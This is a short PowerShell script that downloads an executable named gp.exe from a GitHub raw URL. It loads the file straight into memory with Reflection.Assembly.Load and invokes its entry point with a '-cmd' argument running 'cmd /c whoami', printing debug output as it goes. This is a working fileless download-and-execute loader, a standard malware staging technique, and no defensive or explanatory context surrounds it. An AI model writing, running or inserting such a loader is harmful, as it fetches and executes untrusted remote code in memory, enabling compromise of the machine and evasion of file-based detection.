$ErrorActionPreference="Continue"
try {
    [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
    $u="https://raw.githubusercontent.com/bimhybim-del/ai/main/gp.exe"
    $wc=New-Object Net.WebClient
    Write-Host "Downloading..."
    $b=$wc.DownloadData($u)
    Write-Host "DL OK: $($b.Length) bytes"
    Write-Host "Loading assembly..."
    $a=[Reflection.Assembly]::Load([byte[]]$b)
    Write-Host "ASM: $($a.FullName)"
    $types=$a.GetExportedTypes()
    foreach($t in $types){Write-Host "Type: $($t.FullName)"}
    $ep=$a.EntryPoint
    Write-Host "EntryPoint: $ep"
    if($ep){
        Write-Host "Invoking entry point..."
        $ep.Invoke($null, @(,([string[]]@("-cmd","cmd /c whoami"))))
    }
} catch {
    Write-Host "ERROR: $_"
    Write-Host $_.Exception.InnerException
}
